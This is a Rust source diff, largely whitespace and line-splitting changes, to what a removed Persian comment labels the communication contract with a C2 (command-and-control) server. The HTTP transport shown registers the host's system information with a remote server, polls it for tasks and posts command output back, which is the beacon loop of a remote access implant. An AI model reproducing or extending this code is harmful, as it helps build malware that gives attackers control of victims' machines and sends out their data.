@@ -17,28 +17,33 @@ pub struct Task {
 }
 
 #[derive(Serialize)]
-struct RegisterResp {}
+struct ResultReq {
+    output: String,
+}
 
 #[derive(Deserialize)]
 struct RegisterRespData {
     id: String,
 }
 
-#[derive(Serialize)]
-struct ResultReq {
-    output: String,
-}
-
-/// قرارداد ارتباط با C2
 pub trait Transport: Send + Sync {
-    fn register(&self, info: &SystemInfo) -> Result<String, Error>;
+    fn register(
+        &self,
+        info: &SystemInfo,
+    ) -> Result<String, Error>;
 
-    fn get_task(&self, id: &str) -> Result<Task, Error>;
+    fn get_task(
+        &self,
+        id: &str,
+    ) -> Result<Task, Error>;
 
-    fn send_result(&self, id: &str, output: &str) -> Result<(), Error>;
+    fn send_result(
+        &self,
+        id: &str,
+        output: &str,
+    ) -> Result<(), Error>;
 }
 
-/// پیاده‌سازی HTTP
 pub struct HttpTransport {
     client: ureq::Agent,
     base_url: String,
@@ -60,29 +65,49 @@ impl HttpTransport {
 }
 
 impl Transport for HttpTransport {
-    fn register(&self, info: &SystemInfo) -> Result<String, Error> {
-        let body = serde_json::to_string(info)?;
+    fn register(
+        &self,
+        info: &SystemInfo,
+    ) -> Result<String, Error> {
+        let body =
+            serde_json::to_string(info)?;
 
         let resp = self
             .client
-            .post(&format!("{}/register", self.base_url))
-            .set("Content-Type", "application/json")
+            .post(&format!(
+                "{}/register",
+                self.base_url
+            ))
+            .set(
+                "Content-Type",
+                "application/json",
+            )
             .send_string(&body)?;
 
         let parsed: RegisterRespData =
-            serde_json::from_str(&resp.into_string()?)?;
+            serde_json::from_str(
+                &resp.into_string()?,
+            )?;
 
         Ok(parsed.id)
     }
 
-    fn get_task(&self, id: &str) -> Result<Task, Error> {
+    fn get_task(
+        &self,
+        id: &str,
+    ) -> Result<Task, Error> {
         let resp = self
             .client
-            .get(&format!("{}/task?id={id}", self.base_url))
+            .get(&format!(
+                "{}/task?id={id}",
+                self.base_url
+            ))
             .call()?;
 
         let task: Task =
-            serde_json::from_str(&resp.into_string()?)?;
+            serde_json::from_str(
+                &resp.into_string()?,
+            )?;
 
         Ok(task)
     }
@@ -92,13 +117,22 @@ impl Transport for HttpTransport {
         id: &str,
         output: &str,
     ) -> Result<(), Error> {
-        let body = serde_json::to_string(&ResultReq {
-            output: output.to_string(),
-        })?;
+        let body =
+            serde_json::to_string(
+                &ResultReq {
+                    output: output.to_string(),
+                },
+            )?;
 
         self.client
-            .post(&format!("{}/result?id={id}", self.base_url))
-            .set("Content-Type", "application/json")
+            .post(&format!(
+                "{}/result?id={id}",
+                self.base_url
+            ))
+            .set(
+                "Content-Type",
+                "application/json",
+            )
             .send_string(&body)?;
 
         Ok(())
